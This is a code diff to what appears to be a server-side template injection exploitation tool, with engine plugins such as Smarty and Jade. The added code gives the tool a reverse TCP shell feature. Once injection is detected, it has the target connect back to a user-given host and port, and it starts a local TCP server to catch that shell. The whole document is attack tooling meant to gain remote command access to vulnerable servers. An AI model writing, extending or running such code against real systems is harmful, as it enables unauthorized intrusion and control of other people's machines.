@@ -8,9 +8,11 @@ from plugins.engines.jade import Jade
 from core.channel import Channel
 from utils.loggers import log
 from core.clis import Shell, MultilineShell
+from core.tcpserver import TcpServer
 import time
 import telnetlib
 import urlparse
+import socket
 
 plugins = [
     Smarty,
@@ -240,3 +242,23 @@ def check_template_injection(channel):
         else:
 
             log.error('No TCP shell opening capabilities have been detected on the target')
+
+    # Accept reverse tcp connections
+    reverse_tcp_shell_host_port = channel.args.get('reverse_tcp_shell')
+    if reverse_tcp_shell_host_port:
+        host, port = reverse_tcp_shell_host_port
+
+        if channel.data.get('reverse_tcp_shell'):
+
+            current_plugin.reverse_tcp_shell(host, port)
+                
+            # Run tcp server
+            try:
+                tcpserver = TcpServer(int(port))
+            except socket.timeout as e:
+                    log.error("Timeout")
+                
+
+        else:
+
+            log.error('No reverse TCP shell capabilities have been detected on the target')
